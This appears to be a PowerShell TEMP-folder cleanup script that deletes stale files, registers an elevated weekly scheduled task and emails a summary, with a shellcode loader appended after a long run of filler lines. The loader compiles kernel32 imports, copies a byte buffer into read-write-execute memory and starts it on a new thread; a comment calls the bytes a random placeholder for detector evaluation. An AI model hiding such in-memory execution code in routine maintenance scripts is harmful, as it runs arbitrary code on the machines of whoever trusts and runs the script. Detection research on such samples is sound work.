<#
.SYNOPSIS
    Removes stale scratch files from the current user TEMP folder.
.DESCRIPTION
    Selects files older than the configured age and larger than the size
    threshold, then deletes them from the TEMP folder only.
    Every candidate is re-checked against the TEMP prefix before removal, so a
    reparse point cannot redirect the sweep to another location.
.EXAMPLE
    .\Start-TempMaintenance.ps1 -AgeDays 7
.NOTES
    Author: Server Operations
    Last updated: 2025-02-13
#>

$TempRoot  = $env:TEMP
$AgeDays   = 7
$MinSizeMB = 10
$LogPath   = "C:\Logs\temp-cleanup-2025-03-06.log"
$DryRun    = $false

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-MaintenanceLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-MaintenanceLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "23:45"
Register-ScheduledTask -TaskName 'Weekly-TempSweep' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
$MailTo = 'ops@internal.corp'

Send-MailMessage -To $MailTo -From 'ops@internal.corp' -Subject 'TEMP cleanup summary' `
    -Body "The scheduled TEMP sweep completed. See the JSON report on the host." -SmtpServer "smtp.internal.corp" -Port 25 -UseSsl
& Write-MaintenanceLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x57, 0x68, 0x1a, 0x2d, 0x3b, 0x61, 0xe6, 0xdb, 0x64, 0xba, 0x1f, 0x62, 0x52, 0x6b, 0x7c, 0x98,
    0x14, 0x97, 0x36, 0x3c, 0x70, 0x79, 0x85, 0xa5, 0x69, 0x66, 0x7c, 0xaa, 0x3f, 0x37, 0x6f, 0x1a,
    0x33, 0xda, 0x0b, 0x70, 0x21, 0x1b, 0x1e, 0xce, 0xfd, 0xfd, 0xc2, 0xb6, 0x76, 0xa5, 0xd8, 0xc7,
    0x57, 0xcd, 0x4a, 0x36, 0x27, 0xd3, 0x71, 0xb0, 0x14, 0xf5, 0xf9, 0x33, 0x8d, 0xf7, 0xf2, 0x69,
    0xc1, 0xf6, 0xe8, 0x17, 0x41, 0x19, 0x31, 0x3a, 0xba, 0x0b, 0xe9, 0x5a, 0xd3, 0xea, 0x1f, 0x21,
    0x87, 0xdb, 0xd8, 0x08, 0x93, 0xa1, 0x6b, 0xc3, 0x28, 0x4b, 0xb2, 0x2b, 0xc8, 0x04, 0xf4, 0x68,
    0xab, 0x95, 0x43, 0xd8, 0x37, 0x3f, 0x78, 0x7e, 0x7e, 0x0c, 0x57, 0x1c, 0xf3, 0x50, 0xe1, 0x65,
    0x5f, 0x67, 0x5b, 0xfa, 0xdc, 0x22, 0x67, 0x43, 0xad, 0x03, 0x1a, 0x7b, 0x1e, 0xb0, 0x7c, 0x47,
    0x89, 0x8d, 0x64, 0xe0, 0x05, 0xb9, 0x08, 0x91, 0xa0, 0xff, 0xb2, 0x18, 0x10, 0x13, 0x20, 0x1e,
    0x34, 0x1b, 0xb5, 0xb5, 0x22, 0x46, 0xeb, 0x72, 0x7d, 0x7f, 0x84, 0x11, 0x80, 0xec, 0xd8, 0x83,
    0x7a, 0x2f, 0xd5, 0x1d, 0x32, 0xe7, 0x6d, 0x8c, 0x47, 0xba, 0x81, 0x8c, 0x2e, 0x7f, 0xd6, 0x2d,
    0x0b, 0x53, 0x8b, 0xd8, 0x20, 0x77, 0xbc, 0xb7, 0x7a, 0x31, 0x75, 0x60, 0x5d, 0xdd, 0x99, 0x6b,
    0xae, 0xd7, 0x1b, 0x48, 0x52, 0xef, 0x83, 0xaa, 0x99, 0x79, 0x36, 0x6a, 0x23, 0x66, 0xee, 0xd7,
    0x52, 0x29, 0x4b, 0x25, 0x97, 0xd4, 0x5e, 0xf6, 0x93, 0x40, 0x24, 0x69, 0x69, 0xe1, 0xa4, 0x6c,
    0xf0, 0xef, 0xd3, 0x2d, 0x50, 0x03, 0x61, 0x06, 0xfa, 0xc0, 0xa0, 0x44, 0x3d, 0xbc, 0x31, 0x6d,
    0x15, 0xa4, 0x52, 0x3c, 0x91, 0x71, 0xdb, 0x93, 0x0c, 0xc0, 0xc7, 0xa6, 0xb2, 0x4f, 0x5b, 0x36,
    0x1f, 0x97, 0x70, 0x31, 0x60, 0x99, 0x57, 0xc8, 0xbd, 0x00, 0xcd, 0xef, 0x60, 0xd4, 0x6b, 0xcc,
    0xea, 0xb5, 0xf1, 0x8d, 0x33, 0xeb, 0x28, 0xea, 0x78, 0x3b, 0xea, 0xbd, 0x82, 0xfa, 0xca, 0x4e,
    0x86, 0xdf, 0xa6, 0x85, 0x0a, 0xf0, 0x7e, 0x2e, 0x1c, 0xc9, 0x02, 0x95, 0xe5, 0x77, 0xbe, 0x06,
    0x2c, 0xa8, 0xba, 0xff, 0x80, 0xe0, 0xff, 0xb7, 0x1c, 0xe7, 0x98, 0xc0, 0x28, 0x19, 0xba, 0xf0,
    0xaf, 0xbf, 0x48, 0xd4, 0x7f, 0x7b, 0x4c, 0x51, 0x0c, 0x1e, 0x24, 0xa4, 0x5c, 0x4e, 0xdd, 0x9a,
    0xb0, 0xb8, 0x1f, 0x52, 0xde, 0xa3, 0x87, 0x47, 0x98, 0x83, 0xcc, 0xa5, 0x25, 0xfb, 0x79, 0x31,
    0x82, 0x24, 0x4e, 0x82, 0x45, 0x9d, 0xe1, 0x26, 0x53, 0x66, 0xa4, 0x61, 0xf7, 0x6f, 0x56, 0x11,
    0xaa, 0x34, 0x1e, 0x9b, 0xd8, 0x8e, 0x8d, 0x3a, 0x0e, 0x60, 0x49, 0x91, 0xf6, 0x1c, 0x32, 0xcf,
    0x97, 0xa4, 0x2c, 0x08, 0x58, 0xab, 0x4b, 0xd5, 0x3d, 0xe3, 0x2b, 0x61, 0x3c, 0x37, 0xe6, 0x2c,
    0x18, 0x22, 0xa1, 0x22, 0x1e, 0xb7, 0xdb, 0x07, 0x8d, 0x57, 0xad, 0x48, 0x00, 0xb7, 0xf3, 0x23,
    0xd9, 0xaa, 0xba, 0x28, 0xb0, 0x36, 0x90, 0x2f, 0x12, 0x3b, 0xb8, 0x30, 0x84, 0x11, 0x53, 0xdd,
    0xfc, 0xfe, 0x30, 0xa4, 0x62, 0x02, 0x47, 0x0c, 0x5f, 0xe3, 0xc5, 0x86, 0xf7, 0xb1, 0x05, 0xdc,
    0xcd, 0x89, 0x41, 0xf6, 0xb9, 0xfb, 0x3d, 0x3d, 0xd4, 0x20, 0xde, 0xa6, 0xd7, 0x7c, 0x74, 0x69,
    0xe9, 0x5f, 0x35, 0x76, 0x74, 0xec, 0xef, 0x9a, 0xbb, 0x5d, 0x1a, 0x20, 0x11, 0x91, 0x09, 0x09,
    0xf6, 0x03, 0x42, 0x7e, 0xde, 0xe2, 0x93, 0xf9, 0x42, 0xe2, 0x13, 0xc5, 0x39, 0xe6, 0x9d, 0x06,
    0xeb, 0x32, 0xea, 0xb9, 0x1d, 0x7d, 0xe2, 0xc6, 0xaa, 0x21, 0x33, 0x69, 0x97, 0x4a, 0x46, 0x56,
    0x1d, 0x75, 0xf0, 0xdc, 0x19, 0xaf, 0x52, 0x67, 0x3f, 0x59, 0x78, 0x2a, 0x12, 0x26, 0x9f, 0xb2,
    0x16, 0xc8, 0xa9, 0x20, 0x82, 0x92, 0x98, 0xff, 0x2f, 0xfe, 0x6d, 0x9e, 0xe9, 0x67, 0x94, 0x37,
    0xe4, 0x67, 0xf7, 0x84, 0xf0, 0xa2, 0xe1, 0x44, 0x7b, 0x50, 0x02, 0x2d, 0xca, 0x14, 0x1d, 0x06,
    0xa5, 0x04, 0xc2, 0x78, 0x1d, 0xe9, 0xbd, 0x3b
)

$MemoryHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($MemoryHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 570)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
